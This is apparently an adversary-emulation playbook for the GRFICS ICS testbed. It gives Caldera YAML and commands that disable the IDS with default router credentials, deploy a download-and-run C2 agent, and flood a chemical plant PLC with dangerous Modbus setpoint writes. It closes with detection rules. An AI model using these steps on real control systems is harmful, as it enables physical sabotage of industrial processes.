### Variation: Noisier Approach - Modbus Register Fuzzing

Replace the targeted write step with the fuzzing ability (`c3d4e5f6-3333-3333-3333-000000000004`). This creates chaotic, unpredictable process behavior that is much harder for operators to diagnose but generates significantly more Suricata alerts.

### Escalation Path: Router Compromise to Disable IDS

Before the main attack, compromise the router to disable Suricata and firewall rules:

```yaml
- id: c3d4e5f6-3333-3333-3333-000000000005
  name: Router - Disable IDS via Web Interface
  description: |
    Login to router firewall UI with default creds and disable
    Suricata IDS to prevent detection of subsequent Modbus attacks.
  tactic: evasion
  technique_id: T0816
  technique_name: Device Restart/Shutdown
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -c /tmp/router_cookies.txt
      -X POST "http://192.168.90.200:5000/login"
      -d "username=admin&password=password"
      -L -o /tmp/router_login.html &&
      echo "Router login attempted"
    timeout: 30
```

---

## Attack Chain 4 (Bonus): Safety System Defeat via run_bit Manipulation

**Adversary Profile**: Saboteur targeting the PLC's emergency shutdown capability. The `run_bit` at `%QX5.0` controls the PLC's safe-state behavior. Manipulating it via Modbus writes to the PLC's own Modbus slave interface could disable or interfere with the safety mechanism.

### Technique Mapping

| Stage | Step | Technique Name | Technique ID | Command/Action | Expected Effect |
|-------|------|---------------|-------------|----------------|-----------------|
| **Initial Access** | 1 | Default Credentials | T0812 | Caldera agent on Kali | C2 established |
| **Discovery** | 2 | Remote System Information Discovery | T0888 | Enumerate PLC Modbus interface at 192.168.95.2:502 | Discover PLC's own Modbus slave registers |
| **Collection** | 3 | Point & Tag Identification | T0861 | Read coils and holding registers on PLC (192.168.95.2) | Map %MW and %QX addresses to Modbus registers |
| **Impact** | 4 | Modify Controller Tasking | T0821 | Write setpoint registers (MW0-MW4) to dangerous values | Alter control setpoints: lower pressure_sp, raise level_sp |
| **Inhibit Response** | 5 | Safety Instrumented Function (SIF) Inhibit | T0880 | Write coil for run_bit to FALSE then immediately back to TRUE in a loop | Create intermittent shutdown/restart cycling |
| **Impact** | 6 | Denial of Control | T0813 | Continuously write conflicting setpoints to PLC registers | PLC cannot maintain stable process control |

### Caldera Implementation

**Ability: Read PLC Modbus Registers**

```yaml
- id: d4e5f6a7-4444-4444-4444-000000000001
  name: Modbus - Enumerate PLC Internal Registers
  description: |
    Read holding registers MW0-MW30 on the PLC's own Modbus slave
    at 192.168.95.2:502 to discover setpoint values.
  tactic: collection
  technique_id: T0861
  technique_name: Point & Tag Identification
  executors:
  - platform: linux
    name: sh
    command: >
      echo "=== PLC Holding Registers (Setpoints) ===" &&
      ./modbus_cli 192.168.95.2 --port 502 read_hr 0 31 &&
      echo "=== PLC Coils (run_bit at QX5.0 = coil 40) ===" &&
      ./modbus_cli 192.168.95.2 --port 502 read_c 0 50 &&
      echo "=== PLC Input Registers (process values) ===" &&
      ./modbus_cli 192.168.95.2 --port 502 read_ir 100 13
    payloads:
    - modbus_cli
```

**Ability: Manipulate PLC Setpoints**

```yaml
- id: d4e5f6a7-4444-4444-4444-000000000002
  name: Modbus - Overwrite PLC Setpoints
  description: |
    Write dangerous setpoint values directly to the PLC's Modbus registers.
    MW0 (product_flow_setpoint) = 65535 (max flow),
    MW2 (pressure_sp) = 0 (no pressure control),
    MW4 (level_sp) = 65535 (max level).
  tactic: impair-process-control
  technique_id: T0821
  technique_name: Modify Controller Tasking
  executors:
  - platform: linux
    name: sh
    command: >
      for i in $(seq 1 60); do
        ./modbus_cli 192.168.95.2 --port 502 write_r 0 65535;
        ./modbus_cli 192.168.95.2 --port 502 write_r 2 0;
        ./modbus_cli 192.168.95.2 --port 502 write_r 4 65535;
        sleep 0.5;
      done
    payloads:
    - modbus_cli
```

**Adversary Profile:**

```yaml
name: Safety System Defeat Adversary
description: >
  Targets the PLC's internal Modbus registers to overwrite setpoints
  and manipulate the run_bit, defeating the built-in safe-state
  mechanism of the chemical plant control program.
adversary_id: cc004444-aaaa-bbbb-cccc-000000000004
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
atomic_ordering:
- a1b2c3d4-1111-1111-1111-000000000001  # Network scan
- d4e5f6a7-4444-4444-4444-000000000001  # Enumerate PLC registers
- a1b2c3d4-1111-1111-1111-000000000002  # Read tank state (baseline)
- d4e5f6a7-4444-4444-4444-000000000002  # Overwrite setpoints
- a1b2c3d4-1111-1111-1111-000000000002  # Verify impact on tank
```

---

## Fully Worked Example: Chain 1 from Start to Impact

This section provides an exact, step-by-step reproduction procedure.

### Prerequisites

1. Start the GRFICS environment:
```bash
cd /home/imene/Desktop/Github/GRFICSv3
docker compose up -d
```

2. Verify all containers are running:
```bash
docker compose ps
```

3. Open the 3D simulation at `http://localhost` to observe the chemical plant.

### Step A: Access Caldera and Deploy Agent

1. Open `http://localhost:8888` in your browser.
2. Login: `red` / `fortiphyd-red`
3. Navigate to **Agents** > click the blue **+ Deploy an Agent** button.
4. Select: Platform = `linux`, Agent = `Sandcat`, Contact = `HTTP`, enter `http://192.168.90.250:8888` as the server address.
5. Copy the deployment command.
6. Open Kali at `http://localhost:6088` (noVNC, credentials `kali:kali`).
7. Open a terminal in Kali and run the deployment command:

```bash
server="http://192.168.90.250:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \
  $server/file/download > splunkd;
chmod +x splunkd;
./splunkd -server $server -group red -v
```

8. Return to Caldera UI -- the Kali agent should appear within 60 seconds under **Agents**.

### Step B: Add Custom Abilities via REST API

From your host machine, use the Caldera REST API to create the abilities. For each ability YAML above:

```bash
# Example: Create the "Read Tank Pressure" ability
curl -X POST http://localhost:8888/api/v2/abilities \
  -H "KEY: VEvMp339du5M5efw5TpfUfiChPfbcN2Spc11jJ1y78Y" \
  -H "Content-Type: application/json" \
  -d '{
    "ability_id": "a1b2c3d4-1111-1111-1111-000000000002",
    "name": "Modbus - Read Tank Pressure and Level",
    "description": "Read input registers from Tank device",
    "tactic": "collection",
    "technique_id": "T0801",
    "technique_name": "Monitor Process State",
    "executors": [
      {
        "platform": "linux",
        "name": "sh",
        "command": "./modbus_cli 192.168.95.14 --port 502 read_ir 1 2",
        "payloads": ["modbus_cli"]
      }
    ]
  }'
```

Repeat for all abilities. Alternatively, copy the YAML files directly into the Caldera container:

```bash
docker cp my_ability.yml caldera:/usr/src/app/plugins/modbus/data/abilities/discovery/
docker restart caldera
```

### Step C: Create Adversary Profile

```bash
curl -X POST http://localhost:8888/api/v2/adversaries \
  -H "KEY: VEvMp339du5M5efw5TpfUfiChPfbcN2Spc11jJ1y78Y" \
  -H "Content-Type: application/json" \
  -d '{
    "adversary_id": "cc001111-aaaa-bbbb-cccc-000000000001",
    "name": "ICS Pressure Manipulation Adversary",
    "description": "Multi-stage Modbus attack causing reactor overpressure",
    "atomic_ordering": [
      "a1b2c3d4-1111-1111-1111-000000000001",
      "9360ba0d-46a3-47a1-bbe6-e6c875790500",
      "a1b2c3d4-1111-1111-1111-000000000003",
      "a1b2c3d4-1111-1111-1111-000000000002",
      "a1b2c3d4-1111-1111-1111-000000000004",
      "a1b2c3d4-1111-1111-1111-000000000005"
    ]
  }'
```

### Step D: Launch the Operation

```bash
curl -X POST http://localhost:8888/api/v2/operations \
  -H "KEY: VEvMp339du5M5efw5TpfUfiChPfbcN2Spc11jJ1y78Y" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "ICS-Pressure-Attack-001",
    "adversary": {"adversary_id": "cc001111-aaaa-bbbb-cccc-000000000001"},
    "source": {"id": "0033b644-a615-4eff-bcf3-178e9b17adc3"},
    "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
    "group": "red",
    "auto_close": false,
    "autonomous": 1
  }'
```

### Step E: Observe Impact

1. **Caldera Operations Panel**: Watch each step transition from queued -> running -> finished. Check output for each link.
2. **3D Simulation** (`http://localhost`): Watch the reactor pressure gauge climb and tank level change as valves are manipulated.
3. **HMI** (`http://localhost:6081`): Observe SCADA-LTS data points showing the valve position and pressure deviations.
4. **PLC** (`http://localhost:8080`): Login and check the monitoring dashboard for register value anomalies.

### Step F: Verify Telemetry

Check the shared log volumes for detection evidence:

```bash
# Suricata alerts
docker exec router cat /var/log/suricata/eve.json | \
  python3 -m json.tool | grep -A5 "modbus"

# PLC auth events
cat shared_logs/plc/auth.log

# Simulation process alarms
ls -la shared_logs/simulation/process_alarms/
```

---

## Summary Comparison of All Chains

| Attribute | Chain 1: Direct Modbus Write | Chain 2: PLC Logic Replacement | Chain 3: HMI + Deception | Chain 4: Safety System Defeat |
|-----------|------------------------------|-------------------------------|--------------------------|------------------------------|
| **Primary Target** | Simulation Modbus devices (.10-.15) | PLC OpenPLC runtime (.2) | HMI + Modbus devices | PLC internal registers (.2) |
| **Initial Access** | Agent on Kali | Agent on Kali | Agent on Kali | Agent on Kali |
| **Key Technique** | Write Holding Registers (FC 0x06) | Upload ST program via HTTP | Combined Modbus writes + HMI login | Write setpoints + coils on PLC |
| **Stealth Level** | Medium (direct Modbus from attacker IP) | Low (HTTP traffic to PLC, program change logged) | High (masks attack via spoofed sensors) | Medium (writes to PLC from attacker IP) |
| **Persistence** | None (must sustain writes) | High (malicious logic runs until replaced) | None | Medium (setpoints persist until overwritten) |
| **Physical Impact** | Pressure excursion | Full process loss of control | Pressure excursion + operator blind | Setpoint corruption, intermittent faults |
| **MITRE ICS Techniques** | T0819, T0846, T0842, T0888, T0861, T0801, T0831, T0879 | T0819, T0846, T0812, T0843, T0889, T0827 | T0812, T0846, T0852, T0888, T0801, T0856, T0831, T0829 | T0812, T0888, T0861, T0821, T0880, T0813 |
| **Detection Difficulty** | Easy (unauthorized Modbus source) | Medium (legitimate HTTP to PLC web) | Hard (looks like normal operator activity + sensors spoofed) | Medium (Modbus to PLC from unusual source) |

---

## Detection Engineering Recommendations

For each attack chain, the following detection rules should be developed:

1. **Unauthorized Modbus Source**: Alert when any IP other than `192.168.95.2` (PLC) sends Modbus FC 0x05/0x06/0x0F/0x10 writes to simulation devices (.10-.15). This catches Chains 1, 3, and 4.

2. **PLC Web Interface Access from DMZ**: Alert when HTTP requests to `192.168.95.2:8080` originate from the DMZ subnet (192.168.90.0/24). This catches Chain 2.

3. **Modbus Write Frequency Anomaly**: Alert when more than N Modbus write transactions per second occur from a single source. Baseline the PLC's normal polling rate (100ms = 10/sec across 6 devices) and alert on deviations.

4. **Process Value Deviation**: Alert when pressure exceeds 3000 kPa or deviates more than 10% from 5-minute moving average. This catches the physical impact of all chains.

5. **PLC Program Change**: Alert when the OpenPLC `/upload-program` or `/compile-program` endpoints are accessed. Any program change in a production environment should trigger investigation.

6. **Sensor Value Discrepancy**: Cross-correlate Tank pressure readings with PLC input register values. If they diverge, sensor spoofing (Chain 3 escalation) is likely.

